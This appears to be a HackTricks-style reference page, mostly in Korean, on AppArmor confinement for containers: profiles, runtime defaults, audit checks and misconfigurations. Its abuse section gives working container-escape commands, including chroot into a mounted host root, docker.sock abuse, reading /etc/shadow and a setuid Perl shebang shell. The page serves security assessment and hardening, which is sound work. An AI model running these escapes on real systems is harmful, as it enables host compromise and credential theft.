# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

AppArmor는 프로그램별 프로파일을 통해 제한을 적용하는 **Mandatory Access Control** 시스템입니다. 전통적인 DAC 검사(사용자 및 그룹 소유에 크게 의존하는)와 달리, AppArmor는 커널이 프로세스 자체에 연결된 정책을 강제하도록 합니다. 컨테이너 환경에서는 워크로드가 전통적인 권한으로는 작업을 시도할 수 있을 만큼 권한을 가지고 있더라도, AppArmor 프로파일이 해당 경로, 마운트, 네트워크 동작 또는 capability 사용을 허용하지 않으면 거부될 수 있기 때문에 중요합니다.

가장 중요한 개념적 요점은 AppArmor가 **경로 기반(path-based)** 이라는 것입니다. SELinux가 라벨을 통해 접근을 판단하는 것과 달리, AppArmor는 경로 규칙을 통해 파일시스템 접근을 판단합니다. 이는 접근성이 좋고 강력하다는 장점이 있지만, bind mounts와 대체 경로 레이아웃에는 각별한 주의가 필요하다는 의미이기도 합니다. 동일한 호스트 컨텐츠가 다른 경로로 접근 가능해지면, 정책의 효과가 운영자가 처음 예상한 것과 다를 수 있습니다.

## 컨테이너 격리에서의 역할

Container 보안 검토는 종종 capabilities와 seccomp에서 멈추지만, AppArmor는 이러한 검사 이후에도 여전히 중요합니다. 컨테이너가 가져서는 안 될 권한을 더 많이 가지고 있거나 운영상의 이유로 하나의 추가 capability가 필요한 워크로드를 상상해 보세요. AppArmor는 여전히 파일 접근, 마운트 동작, 네트워킹 및 실행 패턴을 제약하여 명백한 남용 경로를 차단할 수 있습니다. 이것이 바로 AppArmor를 "just to get the application working" 하려고 비활성화하는 것이 단순히 위험한 설정을 조용히 실제로 악용 가능한 설정으로 바꿀 수 있는 이유입니다.

## 실습

호스트에서 AppArmor가 활성화되어 있는지 확인하려면 다음을 사용하세요:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
현재 컨테이너 프로세스가 어떤 사용자로 실행되는지 확인하려면:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
이 차이는 시사점이 있다. 일반적인 경우 프로세스는 runtime이 선택한 프로파일에 연결된 AppArmor 컨텍스트를 보여야 한다. unconfined인 경우에는 그 추가적인 제약 계층이 사라진다.

Docker가 적용했다고 생각하는 것을 확인할 수도 있다:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## 런타임 사용

호스트가 이를 지원하면 Docker는 기본 또는 사용자 지정 AppArmor 프로파일을 적용할 수 있다. Podman 또한 AppArmor 기반 시스템에서 AppArmor와 통합될 수 있지만, SELinux가 우선인 배포판에서는 다른 MAC 시스템이 주로 사용된다. Kubernetes는 AppArmor를 실제로 지원하는 노드에서 워크로드 수준으로 AppArmor 정책을 노출할 수 있다. LXC 및 관련 Ubuntu-family 시스템 컨테이너 환경도 AppArmor를 광범위하게 사용한다.

실무적으로 중요한 점은 AppArmor가 "Docker 기능"이 아니라는 것이다. 여러 런타임이 적용을 선택할 수 있는 호스트-커널 기능이다. 호스트가 이를 지원하지 않거나 런타임이 unconfined로 실행되도록 설정되면, 그 보호는 사실상 존재하지 않는다.

Kubernetes의 경우 현대 API는 `securityContext.appArmorProfile`이다. Kubernetes `v1.30`부터 이전의 베타 AppArmor 주석은 deprecated되었다. 지원되는 호스트에서는 기본 프로파일이 `RuntimeDefault`이고, `Localhost`는 노드에 이미 로드되어 있어야 하는 프로파일을 가리킨다. 이는 매니페스트가 AppArmor를 인식하는 것처럼 보여도 전적으로 노드 측 지원과 사전 로드된 프로파일에 의존할 수 있기 때문에 검토 시 중요하다.

미묘하지만 유용한 운영상의 세부사항은 `appArmorProfile.type: RuntimeDefault`를 명시적으로 설정하는 것이 해당 필드를 단순히 생략하는 것보다 더 엄격하다는 점이다. 필드를 명시하고 노드가 AppArmor를 지원하지 않으면 admission은 실패해야 한다. 필드를 생략하면 워크로드는 AppArmor가 없는 노드에서 여전히 실행될 수 있으며 단지 그 추가적인 격리 계층을 갖지 못할 뿐이다. 공격자 관점에서는 매니페스트와 실제 노드 상태를 모두 확인해야 하는 좋은 이유다.

Docker를 지원하는 AppArmor 호스트에서 가장 널리 알려진 기본 프로파일은 `docker-default`다. 이 프로파일은 Moby의 AppArmor 템플릿에서 생성되며, 일부 capability 기반 PoCs가 기본 컨테이너에서 여전히 실패하는 이유를 설명해 주기 때문에 중요하다. 일반적으로 `docker-default`는 일반적인 네트워킹을 허용하고, `/proc`의 많은 부분에 대한 쓰기를 거부하며, `/sys`의 민감한 영역 접근을 차단하고, 마운트 작업을 차단하며, ptrace를 제한하여 그것이 일반적인 호스트 탐지 수단이 되지 않게 한다. 그 기본값을 이해하면 "컨테이너가 `CAP_SYS_ADMIN`을 가지고 있다"와 "컨테이너가 실제로 내가 관심 있는 커널 인터페이스에 대해 그 권한을 사용할 수 있다"를 구분하는 데 도움이 된다.

## 프로파일 관리

AppArmor 프로파일은 보통 `/etc/apparmor.d/` 아래에 저장된다. 실행 파일 경로의 슬래시를 점(.)으로 바꾸는 명명 규칙이 흔하다. 예를 들어 `/usr/bin/man`에 대한 프로파일은 보통 `/etc/apparmor.d/usr.bin.man`으로 저장된다. 능동 프로파일 이름을 알면 호스트에서 해당 파일을 빠르게 찾을 수 있으므로 이 세부사항은 방어와 평가 모두에서 중요하다.

유용한 호스트 측 관리 명령은 다음을 포함한다:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
이 명령들이 container-security 참조에서 중요한 이유는 프로필이 실제로 어떻게 생성되고 로드되며 complain mode로 전환되고 애플리케이션 변경 후 어떻게 수정되는지를 설명해 주기 때문이다. 운영자가 문제 해결 중에 프로필을 complain mode로 옮긴 뒤 enforcement를 복구하는 것을 잊어버리는 습관이 있다면, 문서상으로는 컨테이너가 보호된 것처럼 보이지만 실제로는 훨씬 더 느슨하게 동작할 수 있다.

### 프로필 생성 및 업데이트

`aa-genprof`는 애플리케이션 동작을 관찰하고 대화형으로 프로필 생성에 도움을 줄 수 있다:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof`는 나중에 `apparmor_parser`로 로드할 수 있는 템플릿 프로필을 생성할 수 있습니다:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
바이너리가 변경되어 정책을 업데이트해야 할 경우, `aa-logprof`는 로그에서 발견된 거부 항목을 재생하여 운영자가 이를 허용할지 거부할지 결정하는 데 도움을 줄 수 있습니다:
```bash
sudo aa-logprof
```
### 로그

AppArmor 거부는 종종 `auditd`, syslog 또는 `aa-notify`와 같은 도구를 통해 표시됩니다:
```bash
sudo aa-notify -s 1 -v
```
이는 운영적으로나 공격적으로 유용하다. 방어자는 프로필을 정교화하기 위해 이를 사용한다. 공격자는 어떤 정확한 경로나 작업이 거부되고 있는지, 그리고 AppArmor가 익스플로잇 체인을 차단하는 제어인지 알아내기 위해 이를 사용한다.

### 정확한 프로필 파일 식별

런타임이 container에 대해 특정 AppArmor 프로필 이름을 표시할 때, 해당 이름을 디스크상의 프로필 파일로 매핑하는 것이 종종 유용하다:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
이는 호스트 측 검토 시 특히 유용합니다. 이는 "컨테이너가 profile `lowpriv`로 실행 중이라고 말한다"와 "실제 규칙은 감사하거나 다시 로드할 수 있는 이 특정 파일에 존재한다" 사이의 간극을 메워주기 때문입니다.

### 감사해야 할 중요한 규칙

프로필을 읽을 수 있을 때에는 단순한 `deny` 라인에서 멈추지 마세요. 몇 가지 규칙 유형은 AppArmor가 컨테이너 탈출 시도에 대해 얼마나 유용한지에 중대한 영향을 줍니다:

- `ux` / `Ux`: 대상 바이너리를 unconfined 상태로 실행합니다. 접근 가능한 helper, shell, 또는 interpreter가 `ux` 아래 허용되어 있다면, 보통 가장 먼저 테스트할 항목입니다.
- `px` / `Px` 및 `cx` / `Cx`: exec 시 프로필 전환을 수행합니다. 이것들이 자동으로 나쁜 것은 아니지만, 전환이 현재보다 훨씬 더 넓은 프로필로 이동할 수 있으므로 감사할 가치가 있습니다.
- `change_profile`: 작업이 즉시 또는 다음 exec 시 다른 로드된 프로필로 전환할 수 있게 허용합니다. 목적지 프로필이 더 약하면, 이는 제한된 도메인에서 벗어나는 의도된 탈출구가 될 수 있습니다.
- `flags=(complain)`, `flags=(unconfined)`, 또는 최신의 `flags=(prompt)`: 이들은 프로필에 대한 신뢰도를 바꿔야 합니다. `complain`은 거부를 강제하는 대신 로그로 남기고, `unconfined`는 경계를 제거하며, `prompt`는 userspace의 결정 경로에 의존합니다.
- `userns` or `userns create,`: 최신 AppArmor 정책은 user namespaces 생성도 중재할 수 있습니다. 컨테이너 프로필이 이를 명시적으로 허용하면, 플랫폼이 AppArmor를 하드닝 전략의 일부로 사용하더라도 중첩된 user namespaces가 계속 작동합니다.

유용한 호스트 측 grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
이런 종류의 감사는 수백 개의 일반 파일 규칙을 들여다보는 것보다 더 유용한 경우가 많다. 탈출(breakout)이 helper를 실행하거나, 새로운 namespace에 진입하거나, 더 덜 제한적인 profile로 벗어나는 것에 의존한다면, 답은 명백한 `deny /etc/shadow r` 형식의 줄들보다 이러한 전환 지향 규칙들에 숨겨져 있는 경우가 많다.

## 잘못된 구성

가장 명백한 실수는 `apparmor=unconfined`이다. 관리자는 profile이 위험하거나 예기치 않은 무언가를 제대로 차단해 애플리케이션이 실패했을 때 디버깅을 위해 이를 설정하는 경우가 많다. 그 플래그가 프로덕션에 남아 있다면 전체 MAC 계층이 사실상 제거된 것이다.

또 다른 미묘한 문제는 파일 권한이 정상으로 보여 bind mounts가 무해하다고 가정하는 것이다. AppArmor는 경로 기반(path-based)이기 때문에 호스트 경로를 다른 마운트 위치에 노출하면 경로 규칙과 나쁘게 상호작용할 수 있다. 세 번째 실수는 호스트 커널이 실제로 AppArmor를 강제하지 않는다면 설정 파일의 profile 이름이 거의 의미가 없다는 것을 잊는 것이다.

## 악용

AppArmor가 없으면 이전에 제약되었던 작업들이 갑자기 작동할 수 있다: bind mounts를 통해 민감한 경로를 읽기, 원래 더 사용하기 어려웠어야 할 procfs나 sysfs의 일부에 접근, capabilities/seccomp가 허용하는 경우 mount 관련 동작 수행, 또는 profile이 보통 거부하는 경로 사용 등. AppArmor는 종종 왜 capability-based breakout 시도가 이론상으로는 "작동해야" 하지만 실제로는 실패하는지를 설명해 주는 메커니즘이다. AppArmor를 제거하면 동일한 시도가 성공하기 시작할 수 있다.

AppArmor가 path-traversal, bind-mount, 또는 mount 기반 악용 체인을 막는 주된 원인이라고 의심된다면, 첫 단계는 보통 profile이 있을 때와 없을 때 무엇이 접근 가능한지 비교하는 것이다. 예를 들어, 호스트 경로가 container 내부에 마운트되어 있다면, 우선 그것을 traverse하고 읽을 수 있는지 확인하는 것으로 시작하라:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
컨테이너에 `CAP_SYS_ADMIN`과 같은 위험한 capability가 있는 경우, 가장 실용적인 테스트 중 하나는 AppArmor가 마운트 작업 또는 민감한 커널 파일시스템에 대한 접근을 차단하는 제어인지 여부를 확인하는 것입니다:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
bind mount을 통해 호스트 경로에 이미 접근 가능한 환경에서는 AppArmor가 비활성화되면 읽기 전용 information-disclosure 문제가 호스트 파일에 대한 직접 접근으로 바뀔 수 있습니다:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
이 명령들의 요점은 AppArmor만으로 탈출이 발생한다는 것이 아니다. AppArmor가 제거되면 많은 파일시스템 및 마운트 기반 악용 경로들이 즉시 테스트 가능해진다는 것이다.

### 전체 예: AppArmor 비활성화 + 호스트 루트 마운트됨

컨테이너에 이미 호스트 루트가 `/host`에 바인드 마운트되어 있다면, AppArmor를 제거함으로써 차단된 파일시스템 악용 경로가 완전한 호스트 탈출로 바뀔 수 있다:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
일단 shell이 host filesystem을 통해 실행되면, workload는 사실상 container boundary를 탈출한 것이다:
```bash
id
hostname
cat /etc/shadow | head
```
### 전체 예시: AppArmor 비활성화 + Runtime Socket

실제 방어막이 runtime state를 둘러싼 AppArmor였다면, 마운트된 socket은 완전한 탈출에 충분할 수 있다:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
정확한 경로는 마운트 지점에 따라 달라지지만, 최종 결과는 같다: AppArmor는 더 이상 runtime API에 대한 접근을 차단하지 않으며, runtime API는 호스트를 손상시킬 수 있는 container를 실행할 수 있다.

### 전체 예시: Path-Based Bind-Mount Bypass

AppArmor가 경로 기반이기 때문에, `/proc/**`를 보호하는 것이 동일한 호스트 procfs 콘텐츠가 다른 경로를 통해 접근 가능한 경우 자동으로 그 콘텐츠를 보호하지는 않는다:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
영향은 무엇이 정확히 마운트되었는지와 대체 경로가 다른 통제를 함께 우회하는지 여부에 따라 달라지지만, 이 패턴은 AppArmor를 단독으로 평가하지 않고 마운트 레이아웃과 함께 평가해야 하는 가장 명확한 이유 중 하나다.

### 전체 예시: Shebang Bypass

AppArmor 정책은 때때로 인터프리터 경로를 대상으로 하여 shebang 처리로 인한 스크립트 실행을 완전히 고려하지 않는 방식으로 작성된다. 역사적인 예로는 첫 줄이 제한된 인터프리터를 가리키는 스크립트를 사용하는 사례가 있었다:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
이런 종류의 예시는 프로파일의 의도와 실제 실행 의미론이 달라질 수 있음을 상기시켜 주기 때문에 중요합니다. 컨테이너 환경에서 AppArmor를 검토할 때는 인터프리터 체인과 대체 실행 경로에 특별한 주의를 기울여야 합니다.

## Checks

이 검사들의 목적은 세 가지 질문에 빠르게 답하는 것입니다: 호스트에서 AppArmor가 활성화되어 있는가, 현재 프로세스가 격리되어 있는가, 그리고 런타임이 실제로 이 컨테이너에 프로파일을 적용했는가?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 지원 호스트에서는 기본적으로 활성화됨 | 오버라이드되지 않으면 `docker-default` AppArmor 프로필을 사용함 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 호스트에 따라 다름 | AppArmor는 `--security-opt`로 지원되지만 정확한 기본값은 호스트/런타임에 따라 달라지며 Docker의 문서화된 `docker-default` 프로필만큼 보편적이지 않음 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 조건부 기본값 | `appArmorProfile.type`가 지정되지 않으면 기본값은 `RuntimeDefault`지만, 노드에서 AppArmor가 활성화된 경우에만 적용됨 | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | 노드/런타임 지원을 따름 | 일반적인 Kubernetes 지원 런타임은 AppArmor를 지원하지만 실제 강제는 여전히 노드 지원과 워크로드 설정에 달려 있음 | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
